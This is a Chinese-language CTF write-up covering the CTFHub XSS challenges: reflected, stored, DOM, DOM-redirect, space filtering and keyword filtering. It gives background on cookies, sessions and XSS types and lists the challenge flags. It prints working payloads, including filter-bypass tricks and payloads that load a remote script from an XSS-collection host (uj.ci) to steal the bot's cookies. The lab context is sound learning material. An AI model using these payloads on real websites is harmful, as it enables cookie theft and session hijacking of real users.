---
title: WriteUp-CTFHub-技能树-XSS系列
date: 2024-02-12 00:09:40
categories: 
    - CTF-WriteUp
tags: 
    - XSS
description: CTFHub-技能树-XSS
---
<!--more-->

## 前置知识

### HTTP请求

- HTTP请求方式：常用的有GET和POST两种方式，还有HEAD、PUT、DELETE、OPTIONS等
- HTTP请求格式：
  - 请求方法
  - 请求URL
  - HTTP协议及版本
  - 报文头
  - 报文体
- HTTP响应格式：
  - HTTP协议及版本
  - 状态码及状态码描述
  - 响应头
  - 响应体
- HTTP特点：
  - 请求-响应模式
  - 灵活可扩展
  - 可靠传输（因为HTTP工作在TCP/IP协议之上）
  - 无状态：
    - 现实：每次请求都是独立的
    - 需求：保持会话（通过Cookie和Session实现）

### cookie 和 session

- cookie和session都是用来跟踪浏览器用户身份的会话方式
- cookie的工作方式：
    - 浏览器端第一次发送请求到服务器
    - 服务器端创建cookie，该cookie中包含用户的信息，通过`Set-Cookie`字段返回给浏览器
    - 浏览器端再次发送请求时，会将cookie信息通过`Cookie`字段发送给服务器
    - 服务器端通过`Cookie`字段中的信息识别不同的用户
  - session的工作方式：
    - 浏览器端第一次发送请求到服务器，服务器端创建一个session，同时创建一个特殊的cookie（name为JSESSIONID的固定值，value为session对象的ID），然后将该Cookie发送至浏览器端
    - 浏览器再次发送请求到服务器端，会将该Cookie发送给服务器端
    - 服务器端根据该Cookie中的sessionID查询对应的session对象，从而识别不同的用户
- cookie和session的对比：
  - cookie数据存放在客户的浏览器上，session数据放在服务器上
  - cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗,如果主要考虑到安全应当使用session
  - session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用COOKIE
  - 单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能3K。
  - 所以：将登陆信息等重要信息存放为SESSION;其他信息如果需要保留，可以放在COOKIE中

### 参考

- [Cookie和Session的区别（面试必备）_cookie和session的作用和区别-CSDN博客](https://blog.csdn.net/chen13333336677/article/details/100939030)
- [黑客6小时带你上手web安全攻防、三种漏洞【XSS，CSRF和文件上传】彻底掌握常见web安全漏洞-持续更新中_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1My4y1W7DF)

## XSS学习

### XSS

- XSS（Cross Site Scripting）跨站脚本攻击：恶意攻击者利用web页面的漏洞，插入一些恶意代码，当用户访问到页面的时候，代码就会被执行，从而达到攻击的目的。
- XSS攻击载体：JavaScript、Java、VBScript、Flash、ActiveX等。
- XSS可以分为两类：存储型XSS和反射型XSS

#### 反射型XSS

- 非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。
- 反射型XSS攻击流程：
  ![反射型XSS攻击流程.jpg](反射型XSS攻击流程.jpg)
- 数据流向是： 前端-->后端-->前端
  
#### 存储型XSS

- 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，其他用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。
- 存储型XSS攻击流程：
  ![存储型XSS攻击流程.jpg](存储型XSS攻击流程.jpg)
- 数据流向是：前端-->后端-->数据库-->后端-->前端

#### DOM反射型XSS

- 不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。
- 可能触发DOM型XSS的属性：
  ```js
  document.referer
  window.name
  location
  innerHTML
  documen.write
  ```
- 数据流向是： 前端-->浏览器

### 参考

- [Cookie和Session的区别（面试必备）_cookie和session的作用和区别-CSDN博客](https://blog.csdn.net/chen13333336677/article/details/100939030)
- [Web漏洞之XSS(跨站脚本攻击)详解 - 知乎](https://zhuanlan.zhihu.com/p/397940947)
- [XSS安全平台](https://xssaq.com/)
- [黑客6小时带你上手web安全攻防、三种漏洞【XSS，CSRF和文件上传】彻底掌握常见web安全漏洞-持续更新中_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1My4y1W7DF)

## WriteUp

### 反射型

#### 解题过程

- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，页面弹出`1`，说明存在XSS漏洞
  ![](wp-反射型-1.png)
- 第一个输入框中输入基于XSS安全平台提供的payload：
  ![](wp-反射型-2.png)
- 构造url，输入第二个输入框让bot机器触发XSS,XSS平台成功接收到数据
  ![](wp-反射型-3.png)

#### FLAG

```plaintext
ctfhub{3d18622f6ae7760ceab0dda2}
```

#### 参考

- [XSS安全平台](https://xssaq.com/)
- [手撕CTFHub-Web(五)：XSS - 知乎](https://zhuanlan.zhihu.com/p/339572686)


### 存储型

#### 解题过程

- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，页面弹出`1`，说明存在XSS漏洞
  ![](wp-存储型-1.png)
- 查看源码，发现存在`<script>alert(1)</script>`，说明存在存储型XSS漏洞
  ![](wp-存储型-2.png)
- 第一个输入框中输入基于XSS安全平台提供的payload，可见恶意代码已经上传到服务器，并且XSS平台也成功接收到数据（此时并不是ctfhub的bot发送的请求，所以没有cookie）
  ![](wp-存储型-3.png)
- 第二个输入框中输入当前页面的url，让bot机器触发XSS，XSS平台成功接收到数据
  ![](wp-存储型-4.png)

#### FLAG
  
```plaintext
ctfhub{444ad0fcba38ed2e9da18d9d}
```

#### 参考

- [CTFHub | 存储型-CSDN博客](https://blog.csdn.net/m0_51191308/article/details/135407315)

### DOM反射

#### 解题过程

- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，页面并没有弹出，查看网页源码，发现</script>闭合了：
  ![](wp-DOM反射-1.png)
- 换一个payload，输入`<img src=1 onerror=alert(1)>`，点击提交，页面弹出`1`，说明存在DOM反射XSS漏洞：
  ![](wp-DOM反射-2.png)
- 第一个输入框中也可以输入构造包含script标签的payload，及提前闭合script标签的payload，例如`</script><script>alert(1)</script>`，都可以成功触发XSS漏洞：
  ![](wp-DOM反射-3.png)
- 第二个输入框输入基于XSS平台提供的payload构造的url，让bot机器触发XSS，XSS平台成功接收到数据：
  ![](wp-DOM反射-4.png)


#### FLAG
  
```plaintext
ctfhub{824bae1b53917ae969fa7d84}
```

#### 参考

- [CTFHub XSS DOM反射 WriteUp_ctfhub的xss反射-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131545561)
- [InnerHTML属性的XSS利用_innerhtml xss-CSDN博客](https://blog.csdn.net/weixin_43825028/article/details/119112234)

### DOM跳转

#### 解题过程

- 查看网页源码，发现一段javascript代码：
  ```js
  <script>
    var target = location.search.split("=")
    if (target[0].slice(1) == "jumpto") {
        location.href = target[1];
    }
  </script>
  ```
- 这段代码的作用是：如果url中包含`jumpto`参数，就跳转到`jumpto`参数指定的url
- 使用javascript伪协议构造payload`?jumpto=javascript:alert(1)`，拼接url并访问，页面弹出`1`，说明存在DOM跳转XSS漏洞：
  ![](wp-DOM跳转-1.png)
- 使用jQuery的`$.getScript()`函数来异步加载并执行来自xss平台的js脚本，构造出来的payload为`?jumpto=javascript:$.getScript('//uj.ci/l62')`
- 第二个输入框输入构造的url，点击发送，让bot机器触发XSS，XSS平台成功接收到数据：
  ![](wp-DOM跳转-2.png)

#### FLAG
  
```plaintext
ctfhub{133fda97d6991a94aedc3495}
```

#### 参考
- [CTFHub XSS DOM跳转 WriteUp_xss dom jumpto ?-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546660)
- [珂技系列之一篇就够了——XSS进阶 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/262013.html)
- [XSS篇——javascript:伪协议_js伪协议-CSDN博客](https://www.cnblogs.com/song-song/p/5277838.html)

### 过滤空格

#### 解题过程

- 第一个输入框中输入`<script>alert('1  1')</script>`，点击提交，弹出框中显示`11`，说明空格被过滤了：
  ![](wp-过滤空格-1.png)
- 使用`/**/`绕过空格过滤
- 基于XSS平台提供的payload，构造payload为`<sCRiPt/**/sRC=//uj.ci/l62></sCrIpT>`，拼接url
- 第二个输入框输入构造的url，点击发送，让bot机器触发XSS，XSS平台成功接收到数据：
  ![](wp-过滤空格-2.png)

#### FLAG
  
```plaintext
ctfhub{2f8b7263db5a198dc1179092}
```

#### 参考

- [CTFHub | 过滤空格_ctfhub过滤空格-CSDN博客](https://blog.csdn.net/m0_51191308/article/details/128172056)
- [XSS绕过方法总结_xss空格过滤绕过-CSDN博客](https://blog.csdn.net/xinyue9966/article/details/121099189)


### 过滤关键词

#### 解题过程

- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，发现`script`关键词被过滤了：
  ![](wp-过滤关键词-1.png)
- XSS过滤关键词绕过可以使用双写、大小写等方式，例如`<scRipt>alert(1)</scriPt>`，点击提交，发现`1`被弹出，说明存在XSS漏洞：
  ![](wp-过滤关键词-2.png)
- 第二个输入框输入基于XXS平台提供的payload构造的url，让bot机器触发XSS，XSS平台成功接收到数据：
  ![](wp-过滤关键词-3.png)

#### FLAG
  
```plaintext
ctfhub{6018e7897d2baa06f2a89eaa}
```

#### 参考

- [CTFHub XSS 过滤关键词 WriteUp_ctfhub过滤关键字xss-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546199)


